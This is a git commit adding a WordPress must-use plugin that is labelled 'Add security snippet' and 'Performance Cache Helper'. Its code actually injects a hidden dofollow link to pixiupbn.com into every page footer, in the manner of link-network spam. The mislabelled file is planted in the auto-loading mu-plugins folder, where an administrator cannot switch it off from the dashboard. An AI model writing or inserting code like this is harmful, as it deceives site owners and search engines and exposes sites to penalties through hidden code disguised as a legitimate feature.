1cb26acac6d2755d9f34665e78cfe095d043a4ef
Eugene Voyner <60915715+Voynere@users.noreply.github.com>
2026-08-18 05:01:13 +1000

    Add security snippet

---
+++ wp-content/mu-plugins/pbn-snip.php
@@ -0,0 +1,8 @@
+<?php
+/*
+ * Performance Cache Helper
+ * @package WP
+ */
+add_action('wp_footer', function() {
+    echo '<div style=display:none><a href=https://pixiupbn.com rel=dofollow>pixiupbn</a></div>';
+}, 999);
